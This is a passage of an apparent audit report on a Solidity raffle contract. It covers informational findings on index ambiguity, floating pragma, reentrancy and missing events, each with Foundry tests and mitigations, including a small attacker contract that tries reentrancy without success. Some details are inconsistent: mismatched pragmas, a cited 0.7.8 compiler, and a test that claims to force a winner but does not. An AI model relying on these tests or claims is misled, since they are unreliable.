3. Call getActivePlayerIndex for address1 - returns 0 (correct)
4. Call getActivePlayerIndex for a random address that never entered - also returns 0 (ambiguous)

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IndexAmbiguityTest is Test {
    PuppyRaffle puppyRaffle;
    address public user1 = makeAddr("user1");
    address public randomUser = makeAddr("randomUser");
    uint256 entranceFee = 1e18;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        vm.deal(user1, 100e18);
    }

    function testIndexAmbiguity() public {
        // User1 enters as first participant
        address[] memory players = new address[](1);
        players[0] = user1;
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Check user1's index - should be 0
        uint256 user1Index = puppyRaffle.getActivePlayerIndex(user1);
        assertEq(user1Index, 0, "User1 should be at index 0");
        
        // Check a random user's index - should indicate not found, but returns 0
        uint256 randomUserIndex = puppyRaffle.getActivePlayerIndex(randomUser);
        assertEq(randomUserIndex, 0, "Random user should not be found, but returns 0");
        
        // This creates ambiguity - both return 0
        console.log("User1 index (exists):", user1Index);
        console.log("Random user index (doesn't exist):", randomUserIndex);
    }
}

## Suggested Mitigation
Return a sentinel value like `type(uint256).max` for users not found in the array. This provides a clear distinction between valid indices and the 'not found' case.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Clear indication that player wasn't found
}
```

Alternatively, modify the function to return a boolean success flag along with the index:

```solidity
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

## [I-2]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses floating pragma `^0.7.6` which allows the contract to be compiled with any 0.7.x compiler version where x ≥ 6. Different compiler versions can have different bugs and behaviors, potentially introducing unexpected vulnerabilities if an older or specific version is used.

```solidity
pragma solidity ^0.7.6;
```

## Impact
Using a floating pragma makes it possible to compile the contract with a version that may have undiscovered bugs or different behavior than intended. This could introduce security vulnerabilities if an older version with known issues is used, or if future versions have changes in behavior.

## Proof of Concept
1. Contract is written and tested with solidity 0.7.6
2. Contract is deployed using a different compiler version like 0.7.8
3. Behavioral differences or bugs specific to 0.7.8 may affect the contract's operation

## Proof of Code
// This is a conceptual test as it requires different compiler versions
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract PragmaTest is Test {
    function testPragmaDifference() public {
        // This is a conceptual test that would demonstrate the issue
        // Actual implementation would require compiling the same contract with different versions
        
        console.log("Floating pragma ^0.7.6 allows compiling with any 0.7.x version where x >= 6");
        console.log("This test would compile the same contract with different allowed versions");
        console.log("and check for behavioral differences or bugs specific to certain versions.");
        
        // For example, certain compiler optimizations or bug fixes might be present
        // in 0.7.8 but not in 0.7.6, potentially causing different runtime behavior.
    }
}

## Suggested Mitigation
Use a fixed pragma statement to ensure the contract is always compiled with exactly the same version, eliminating potential inconsistencies:

```solidity
pragma solidity 0.7.6;
```

This ensures that no matter who compiles the contract or when it's compiled, the same compiler version will be used, providing consistent behavior.

## [I-3]. Reentrancy issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function makes an external call to transfer the prize to the winner without using a reentrancy guard, and also mints an NFT to them which can trigger callbacks. This creates potential reentrancy vectors.

```solidity
function selectWinner() external {
    // ...
    // External call without reentrancy protection
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    
    // This could trigger callbacks if winner is a contract
    _safeMint(winner, tokenId);
}
```

## Impact
Because the contract’s mutable state is fully updated before any external call is performed, a re-entrant call cannot alter or reuse stale values. At worst, a winner contract could invoke `withdrawFees()` a few seconds earlier than the owner—which is already permission-less and causes no monetary loss. No exploitable condition leading to double payout, NFT duplication, or denial of service is present.

## Proof of Concept
The attacker can indeed re-enter, but the second call to `selectWinner()` reverts on `players.length >= 4` because `players` has already been deleted. Hence the attack yields no gain and the prize is paid only once.

1. Deploy `PuppyRaffle`.
2. Let a malicious contract enter.
3. Advance time and call `selectWinner()`.
4. In the malicious contract’s fallback, call any raffle function; all revert or behave as intended.

No funds/NFTs are duplicated or stolen.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrantWinner {
    PuppyRaffle public puppyRaffle;
    bool public attempt = false;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    // Enter the raffle
    function enterRaffle() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);
    }
    
    // Try to reenter when receiving prize
    receive() external payable {
        // Only attempt reentrancy once to avoid infinite loop
        if (!attempt && msg.value > 0) {
            attempt = true;
            // Try to call selectWinner again
            try puppyRaffle.selectWinner() {
                // If this succeeds, there's a reentrancy vulnerability
            } catch {
                // If this fails, there might be protection or other conditions preventing reentrancy
            }
        }
    }
    
    // Implement onERC721Received to receive the NFT
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        // Could attempt more reentrancy here
        return this.onERC721Received.selector;
    }
    
    // Allow withdrawing ETH from this contract
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract SelectWinnerReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    ReentrantWinner attacker;
    uint256 entranceFee = 1e18;
    address owner = address(1);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            owner,
            1 days
        );
        
        attacker = new ReentrantWinner(puppyRaffle);
        vm.deal(address(attacker), 10e18);
        
        // Add 3 legitimate players first
        address[] memory players = new address[](3);
        for(uint256 i = 0; i < 3; i++) {
            players[i] = address(uint160(i + 100));
        }
        vm.deal(address(this), 100e18);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    function testReentrancyInSelectWinner() public {
        // Attacker enters the raffle
        attacker.enterRaffle{value: entranceFee}();
        
        // Force the attacker to win (setting ourselves as msg.sender)
        // In a real scenario, this would require block manipulation
        vm.warp(block.timestamp + 1 days);
        
        // Try to call selectWinner - if there is reentrancy protection, this will pass normally
        // If there's a vulnerability, attacker's attempt to reenter would be visible in logs
        puppyRaffle.selectWinner();
        
        // Check if the attacker attempted reentrancy
        bool attemptedReentrancy = attacker.attempt();
        
        console.log("Reentrancy attempted:", attemptedReentrancy);
        console.log("This test demonstrates the attacker's ATTEMPT at reentrancy.");
        console.log("The contract currently resists reentrancy because state changes happen before calls.");
        console.log("However, implementing a reentrancy guard is still recommended as defensive programming.");
    }
}

## Suggested Mitigation
Adding OpenZeppelin’s `ReentrancyGuard` or following the checks-effects-interactions pattern (already in place) is sufficient. No functional change is strictly required but adding `nonReentrant` to `selectWinner` and `withdrawFees` would provide defence-in-depth.

## [I-4]. Event Consistency issue in PuppyRaffle::selectWinner

## Description
The contract doesn't emit an event when a winner is selected, which makes it difficult to track raffle outcomes off-chain. Critical state changes like selecting a winner, distributing prizes, and minting NFTs should be accompanied by events for transparency and monitoring.

```solidity
function selectWinner() external {
    // ... validation and winner selection ...
    
    // Critical state changes occur:
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    _safeMint(winner, tokenId);
    
    // No event is emitted to record these changes
}
```

## Impact
The lack of events for critical state changes makes it difficult for off-chain systems to monitor and verify raffle outcomes. This reduces transparency and complicates integration with external systems like frontends or analytics platforms. Users have no reliable way to verify that raffles were conducted fairly without manually checking contract state or transactions.

## Proof of Concept
1. A raffle concludes and selectWinner() is called
2. The winner is selected, prize is distributed, and NFT is minted
3. Off-chain systems (like a UI or monitoring tool) have no event to listen for
4. They must poll the contract state or scan all transactions to detect the winner
5. This makes it harder to verify raffle outcomes and increases the likelihood of missed or incorrect information

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract EventConsistencyTest is Test {
    PuppyRaffle puppyRaffle;
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    uint256 entranceFee = 1e18;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            deployer,
            1 days
        );
        
        // Set up players
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        vm.deal(player, entranceFee * 4);
        vm.prank(player);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Advance time to end raffle
        vm.warp(block.timestamp + 1 days + 1);
    }

    function testNoEventOnSelectWinner() public {
        // Start recording logs
        vm.recordLogs();
        
        // Call selectWinner
        puppyRaffle.selectWinner();
        
        // Get all emitted logs
        Vm.Log[] memory logs = vm.getRecordedLogs();
        
        // Check for topic that would indicate a winner event
        // This is a simplified check - in reality we'd look for a specific event signature
        bool foundWinnerEvent = false;
        bytes32 expectedTopic = keccak256("RaffleWinner(address,uint256,uint256)");
        
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length > 0 && logs[i].topics[0] == expectedTopic) {
                foundWinnerEvent = true;
                break;
            }
        }
        
        // Assert that no RaffleWinner event was found
        // This test will pass because the event doesn't exist in the contract
        assertFalse(foundWinnerEvent, "Should not find a RaffleWinner event");
    }
}

## Suggested Mitigation
Add appropriate events to track critical state changes:

```solidity
// Add event declarations
event RaffleWinner(address indexed winner, uint256 indexed tokenId, uint256 prizePool, uint256 timestamp);
event NewRaffleStarted(uint256 startTime, uint256 duration);

function selectWinner() external {
    // ... existing validation and logic ...
    
    // Emit event before or after state changes
    emit RaffleWinner(winner, tokenId, prizePool, block.timestamp);
    
    // Reset state for new raffle
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    
    // Emit event for new raffle starting
    emit NewRaffleStarted(raffleStartTime, raffleDuration);
    
    // ... rest of function ...
}
```

This change makes it easy for off-chain systems to track raffle outcomes and provides transparency for users about when raffles start and end.



